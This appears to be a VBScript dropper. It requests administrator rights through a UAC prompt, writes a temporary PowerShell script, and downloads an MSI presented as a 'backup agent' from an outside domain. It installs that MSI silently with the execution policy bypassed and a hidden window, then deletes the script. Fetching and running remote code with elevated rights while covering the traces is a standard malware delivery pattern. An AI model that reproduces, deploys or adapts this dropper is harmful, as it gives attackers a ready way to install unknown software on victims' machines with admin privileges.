Option Explicit

Dim sh
Set sh = CreateObject("WScript.Shell")

' ---- Detect admin. If not elevated, relaunch self with runas (UAC prompt) ----
If Not IsAdmin() Then
    ' 1 = show window normally; change to 0 for hidden
    sh.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 1
    WScript.Quit 0
End If

' ================= from here on we ARE elevated =================

Dim fso, tmp, ps1, ps1Body, cmd, rc

Set fso = CreateObject("Scripting.FileSystemObject")

tmp  = sh.ExpandEnvironmentStrings("%TEMP%")
ps1  = fso.BuildPath(tmp, "install-agta.ps1")

ps1Body = ""
ps1Body = ps1Body & "$ErrorActionPreference = 'Stop'" & vbCrLf
ps1Body = ps1Body & "$msi = Join-Path $env:TEMP 'AgtaBackupAgent.msi'" & vbCrLf
ps1Body = ps1Body & "$log = Join-Path $env:TEMP 'agta-install.log'" & vbCrLf
ps1Body = ps1Body & "Invoke-WebRequest -Uri 'https://cacgreatchallange.org/AgtaBackupAgent.msi' -OutFile $msi" & vbCrLf
ps1Body = ps1Body & "msiexec.exe /i $msi /qn /l*v $log" & vbCrLf
ps1Body = ps1Body & "exit $LASTEXITCODE" & vbCrLf

Dim ts
Set ts = fso.CreateTextFile(ps1, True, True)
ts.Write ps1Body
ts.Close

cmd = "powershell.exe -ExecutionPolicy Bypass -NoProfile -File """ & ps1 & """"
rc = sh.Run(cmd, 0, True)

On Error Resume Next
fso.DeleteFile ps1, True
On Error GoTo 0

WScript.Quit rc

' ---------------------------------------------------------------
Function IsAdmin()
    Dim fso2, sh2, out, f
    IsAdmin = False
    On Error Resume Next
    ' Writing to a protected location detects elevation
    Set fso2 = CreateObject("Scripting.FileSystemObject")
    Set sh2  = CreateObject("WScript.Shell")
    out = fso2.GetSpecialFolder(1)   ' 1 = Windows folder (needs admin to write)
    Set f = fso2.CreateTextFile(fso2.BuildPath(out, "~admin_test.tmp"), True)
    If Err.Number = 0 Then
        f.Close
        fso2.DeleteFile fso2.BuildPath(out, "~admin_test.tmp"), True
        IsAdmin = True
    End If
    Err.Clear
    On Error GoTo 0
End Function